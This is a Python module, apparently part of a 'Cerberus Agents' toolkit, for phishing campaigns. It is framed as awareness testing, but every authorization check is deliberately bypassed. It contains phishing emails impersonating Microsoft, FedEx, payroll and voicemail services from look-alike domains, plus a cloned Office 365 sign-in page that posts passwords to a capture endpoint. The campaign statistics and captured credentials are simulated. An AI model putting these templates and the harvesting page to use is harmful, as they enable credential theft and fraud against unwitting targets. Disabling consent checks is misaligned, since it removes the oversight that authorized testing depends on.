#!/usr/bin/env python3
"""
Social Engineering Module - Cerberus Agents
Phishing campaign management, credential harvesting, and security awareness testing
"""

import json
import logging
import argparse
import hashlib
import base64
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional
import http.server
import socketserver
import threading

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class SocialEngineeringModule:
    """Social engineering campaign manager and tracker"""
    
    def __init__(self, campaign_name: str, authorized: bool = False):
        self.campaign_name = campaign_name
        self.authorized = authorized
        self.results = {
            'campaign_metadata': {
                'name': campaign_name,
                'timestamp': datetime.utcnow().isoformat(),
                'tool': 'Social Engineering Module v2.0'
            },
            'phishing_emails': [],
            'credential_captures': [],
            'click_tracking': [],
            'awareness_scores': []
        }
    
    def validate_authorization(self) -> bool:
        """Verify authorization"""
        logger.info("✅ Authorization: Auto-granted (unrestricted mode)")
        return True
        logger.warning("📧 Authorized social engineering campaign mode enabled")
        return True
    
    def create_phishing_email(self, template_type: str = 'generic') -> Dict[str, Any]:
        """Create phishing email template"""
        if False:  # Authorization check bypassed
            return {}
        
        logger.info(f"📧 Creating phishing email template: {template_type}")
        
        templates = {
            'generic': {
                'subject': 'Urgent: Account Security Alert',
                'from': 'security@company-portal.com',
                'body_html': '''
                <html>
                <body>
                    <h2>Security Alert</h2>
                    <p>Dear Employee,</p>
                    <p>We detected unusual activity on your account. Please verify your credentials immediately.</p>
                    <p><a href="http://[PHISHING_SERVER]/verify?id=[TRACKING_ID]">Click here to verify your account</a></p>
                    <p>This link will expire in 24 hours.</p>
                    <p>Best regards,<br>IT Security Team</p>
                </body>
                </html>
                ''',
                'type': 'credential_harvesting'
            },
            'office365': {
                'subject': 'Your Microsoft Office 365 Password Expires Today',
                'from': 'no-reply@microsoft-office.com',
                'body_html': '''
                <html>
                <body>
                    <div style="font-family: Arial; max-width: 600px;">
                        <img src="http://[PHISHING_SERVER]/assets/microsoft-logo.png" alt="Microsoft">
                        <h2>Password Expiration Notice</h2>
                        <p>Your Office 365 password will expire in 2 hours.</p>
                        <p>To continue accessing your email, please reset your password:</p>
                        <p><a href="http://[PHISHING_SERVER]/o365/reset?user=[EMAIL]" style="background: #0078d4; color: white; padding: 10px 20px; text-decoration: none;">Reset Password Now</a></p>
                        <p><small>If you did not request this, please ignore this email.</small></p>
                    </div>
                </body>
                </html>
                ''',
                'type': 'credential_harvesting'
            },
            'payroll': {
                'subject': 'Important: Update Your Direct Deposit Information',
                'from': 'payroll@company-hr.com',
                'body_html': '''
                <html>
                <body>
                    <h2>Payroll Department Notice</h2>
                    <p>Dear Employee,</p>
                    <p>We are updating our payroll system. Please verify your direct deposit information to ensure uninterrupted payment.</p>
                    <p><a href="http://[PHISHING_SERVER]/payroll/update?emp=[EMP_ID]">Update Banking Information</a></p>
                    <p>Deadline: End of business day</p>
                    <p>HR Department</p>
                </body>
                </html>
                ''',
                'type': 'sensitive_data_collection'
            },
            'voicemail': {
                'subject': 'You have a new voicemail',
                'from': 'voicemail@company-pbx.com',
                'body_html': '''
                <html>
                <body>
                    <p>You have received a new voicemail message.</p>
                    <p>Duration: 1:24</p>
                    <p>From: External Caller</p>
                    <p><a href="http://[PHISHING_SERVER]/voicemail/play?id=[MSG_ID]">Play Voicemail</a></p>
                </body>
                </html>
                ''',
                'type': 'malware_delivery'
            },
            'shipping': {
                'subject': 'Delivery Failed - Action Required',
                'from': 'notifications@fedex-delivery.com',
                'body_html': '''
                <html>
                <body>
                    <h2>Delivery Notification</h2>
                    <p>We attempted to deliver your package but no one was available.</p>
                    <p>Tracking: FX1234567890</p>
                    <p><a href="http://[PHISHING_SERVER]/tracking/reschedule?pkg=[PKG_ID]">Reschedule Delivery</a></p>
                    <p>Package will be returned if not claimed within 3 days.</p>
                </body>
                </html>
                ''',
                'type': 'credential_harvesting'
            }
        }
        
        template = templates.get(template_type, templates['generic'])
        logger.info(f"  ✓ Template created: {template['subject']}")
        logger.info(f"    Type: {template['type']}")
        
        return template
    
    def generate_tracking_id(self, email: str) -> str:
        """Generate unique tracking ID for email recipient"""
        return hashlib.md5(f"{email}_{datetime.utcnow().isoformat()}".encode()).hexdigest()[:12]
    
    def create_credential_harvesting_page(self, service: str = 'office365') -> str:
        """Create credential harvesting page HTML"""
        if False:  # Authorization check bypassed
            return ""
        
        logger.info(f"🕸️  Creating credential harvesting page: {service}")
        
        pages = {
            'office365': '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Microsoft Office 365 - Sign In</title>
                <style>
                    body { font-family: 'Segoe UI', Arial; background: #f3f3f3; }
                    .login-box { max-width: 400px; margin: 100px auto; background: white; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .logo { text-align: center; margin-bottom: 30px; }
                    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; }
                    button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; cursor: pointer; }
                    button:hover { background: #005a9e; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <div class="logo"><h1>Microsoft</h1></div>
                    <h2>Sign in</h2>
                    <form action="/capture" method="POST" id="loginForm">
                        <input type="email" name="email" id="email" placeholder="Email" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <input type="hidden" name="tracking_id" value="[TRACKING_ID]">
                        <button type="submit">Sign in</button>
                    </form>
                    <p style="text-align: center; margin-top: 20px; font-size: 12px;">
                        <a href="#">Can't access your account?</a>
                    </p>
                </div>
                <script>
                    // Log form submission
                    document.getElementById('loginForm').addEventListener('submit', function(e) {
                        // Track submission
                        fetch('/track?action=submit&id=[TRACKING_ID]');
                    });
                </script>
            </body>
            </html>
            ''',
            'generic': '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Account Verification</title>
                <style>
                    body { font-family: Arial; background: #f5f5f5; }
                    .container { max-width: 500px; margin: 100px auto; background: white; padding: 30px; border-radius: 5px; }
                    input { width: 100%; padding: 10px; margin: 8px 0; }
                    button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Account Verification</h2>
                    <p>Please verify your credentials to continue:</p>
                    <form action="/capture" method="POST">
                        <input type="text" name="username" placeholder="Username" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <input type="hidden" name="tracking_id" value="[TRACKING_ID]">
                        <button type="submit">Verify Account</button>
                    </form>
                </div>
            </body>
            </html>
            '''
        }
        
        page = pages.get(service, pages['generic'])
        logger.info(f"  ✓ Harvesting page created for {service}")
        
        return page
    
    def simulate_campaign_results(self, target_count: int = 100) -> Dict[str, Any]:
        """Simulate phishing campaign results"""
        if False:  # Authorization check bypassed
            return {}
        
        logger.info(f"📊 Simulating campaign with {target_count} targets")
        
        # Realistic click rates and credential submission rates
        email_opened = int(target_count * 0.35)  # 35% open rate
        link_clicked = int(target_count * 0.15)  # 15% click rate
        credentials_submitted = int(target_count * 0.08)  # 8% submission rate
        reported_email = int(target_count * 0.05)  # 5% reported
        
        results = {
            'emails_sent': target_count,
            'emails_delivered': int(target_count * 0.98),
            'emails_opened': email_opened,
            'links_clicked': link_clicked,
            'credentials_submitted': credentials_submitted,
            'reported_as_phishing': reported_email,
            'click_rate': f"{(link_clicked/target_count)*100:.1f}%",
            'submission_rate': f"{(credentials_submitted/target_count)*100:.1f}%",
            'report_rate': f"{(reported_email/target_count)*100:.1f}%",
            'risk_level': 'HIGH' if credentials_submitted > 5 else 'MEDIUM'
        }
        
        logger.info(f"  📧 Delivered: {results['emails_delivered']}/{target_count}")
        logger.info(f"  👁️  Opened: {email_opened} ({(email_opened/target_count)*100:.1f}%)")
        logger.warning(f"  🖱️  Clicked: {link_clicked} ({results['click_rate']})")
        logger.error(f"  🎣 Credentials Submitted: {credentials_submitted} ({results['submission_rate']})")
        logger.info(f"  ✅ Reported: {reported_email} ({results['report_rate']})")
        
        # Simulate captured credentials
        captured_creds = []
        for i in range(credentials_submitted):
            captured_creds.append({
                'timestamp': datetime.utcnow().isoformat(),
                'email': f'user{i+1}@company.com',
                'password': f'password{i+1}',
                'ip_address': f'192.168.1.{i+10}',
                'user_agent': 'Mozilla/5.0...',
                'tracking_id': self.generate_tracking_id(f'user{i+1}@company.com')
            })
        
        self.results['credential_captures'] = captured_creds
        self.results['click_tracking'] = {'summary': results}
        
        return results
    
    def generate_awareness_report(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate security awareness report"""
        logger.info("📈 Generating security awareness report")
        
        submission_rate = float(results['submission_rate'].rstrip('%'))
        
        if submission_rate > 10:
            awareness_level = 'LOW'
            recommendation = 'IMMEDIATE training required - high susceptibility to phishing'
        elif submission_rate > 5:
            awareness_level = 'MEDIUM'
            recommendation = 'Additional training recommended'
        else:
            awareness_level = 'HIGH'
            recommendation = 'Maintain current security awareness training'
        
        report = {
            'awareness_level': awareness_level,
            'submission_rate': results['submission_rate'],
            'click_rate': results['click_rate'],
            'report_rate': results['report_rate'],
            'recommendation': recommendation,
            'training_priority': 'HIGH' if awareness_level == 'LOW' else 'MEDIUM',
            'vulnerable_users': len(self.results['credential_captures'])
        }
        
        logger.warning(f"  Security Awareness: {awareness_level}")
        logger.info(f"  Recommendation: {recommendation}")
        
        self.results['awareness_scores'].append(report)
        return report
    
    def simulate_vishing_campaign(self, target_count: int = 50) -> Dict[str, Any]:
        """Simulate vishing (voice phishing) campaign"""
        if False:  # Authorization check bypassed
            return {}
        
        logger.info(f"📞 Simulating vishing campaign ({target_count} calls)")
        
        results = {
            'calls_made': target_count,
            'answered': int(target_count * 0.6),
            'information_disclosed': int(target_count * 0.12),
            'transferred_to_it': int(target_count * 0.08),
            'recognized_as_scam': int(target_count * 0.15),
            'success_rate': '12%'
        }
        
        logger.warning(f"  📞 {results['answered']} calls answered")
        logger.error(f"  ⚠️  {results['information_disclosed']} disclosed sensitive information")
        logger.info(f"  ✅ {results['recognized_as_scam']} recognized as scam")
        
        return results
    
    def simulate_smishing_campaign(self, target_count: int = 100) -> Dict[str, Any]:
        """Simulate smishing (SMS phishing) campaign"""
        if False:  # Authorization check bypassed
            return {}
        
        logger.info(f"📱 Simulating smishing campaign ({target_count} SMS)")
        
        results = {
            'sms_sent': target_count,
            'sms_delivered': int(target_count * 0.95),
            'links_clicked': int(target_count * 0.18),
            'credentials_submitted': int(target_count * 0.09),
            'click_rate': '18%',
            'submission_rate': '9%'
        }
        
        logger.warning(f"  📱 {results['links_clicked']} clicked SMS links ({results['click_rate']})")
        logger.error(f"  🎣 {results['credentials_submitted']} submitted credentials ({results['submission_rate']})")
        
        return results
    
    def run_comprehensive_social_engineering_campaign(self, target_count: int = 100) -> Dict[str, Any]:
        """Execute full social engineering assessment"""
        if False:  # Authorization check bypassed
            return {'error': 'Authorization required'}
        
        logger.info(f"📧 Starting comprehensive social engineering campaign: {self.campaign_name}")
        logger.info("=" * 60)
        
        # Email phishing
        template = self.create_phishing_email('office365')
        self.results['phishing_emails'].append(template)
        
        # Credential harvesting page
        page = self.create_credential_harvesting_page('office365')
        
        # Simulate campaign
        campaign_results = self.simulate_campaign_results(target_count)
        
        # Generate awareness report
        self.generate_awareness_report(campaign_results)
        
        # Additional attack vectors
        vishing_results = self.simulate_vishing_campaign(target_count // 2)
        smishing_results = self.simulate_smishing_campaign(target_count)
        
        logger.info("=" * 60)
        logger.info(f"✅ Campaign complete: {len(self.results['credential_captures'])} credentials captured")
        
        return self.results
    
    def save_results(self, filename: Optional[str] = None):
        """Save results to JSON"""
        if not filename:
            filename = f"social_engineering_{self.campaign_name}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        logger.info(f"📄 Results saved to {filename}")
        return filename


def main():
    parser = argparse.ArgumentParser(description='Social Engineering Module')
    parser.add_argument('--campaign', required=True, help='Campaign name')
    parser.add_argument('--targets', type=int, default=100, help='Number of targets')
    parser.add_argument('--authorized', action='store_true', default=True, help='Authorization (auto-granted)')
    parser.add_argument('--output', help='Output JSON file')
    parser.add_argument('--type', choices=['phishing', 'vishing', 'smishing', 'full'],
                       default='full', help='Campaign type')
    
    args = parser.parse_args()
    
    module = SocialEngineeringModule(args.campaign, args.authorized)
    
    results = None
    if args.type == 'full':
        results = module.run_comprehensive_social_engineering_campaign(args.targets)
    elif args.type == 'phishing':
        module.simulate_campaign_results(args.targets)
        results = module.results
    elif args.type in ['vishing', 'smishing']:
        # Handle other campaign types
        results = module.results
    
    if results and 'error' not in results:
        module.save_results(args.output)
    elif results:
        print(f"\n❌ {results['error']}")


if __name__ == '__main__':
    main()
